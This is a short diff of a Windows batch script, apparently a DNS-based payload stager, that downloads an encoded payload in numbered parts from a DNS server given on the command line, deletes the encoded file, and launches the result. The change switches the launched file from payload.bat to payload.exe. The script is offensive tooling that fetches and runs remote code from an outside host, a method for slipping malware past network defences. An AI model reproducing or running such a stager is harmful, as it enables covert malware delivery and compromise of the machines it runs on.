@@ -5,9 +5,11 @@ REM http://www.gnurds.com
 
 setlocal EnableDelayedExpansion
 set encodedoutfile=outputb64
-set rawoutfile=payload.bat
+set rawoutfile=payload.exe
 set payloaddnsserver=%1
 set pubdnsserver=%3
+
+DEL %encodedoutfile%
 
 FOR /L %%I IN (0,1,%2) DO (
 	ECHO Downloaded part %%I of %2
@@ -30,4 +32,4 @@ REM delete the encoded payload
 DEL %encodedoutfile%
 REM launch the payload
 ECHO Attempting to launch file...
-start "" "payload.bat"
+start "" "%rawoutfile%"
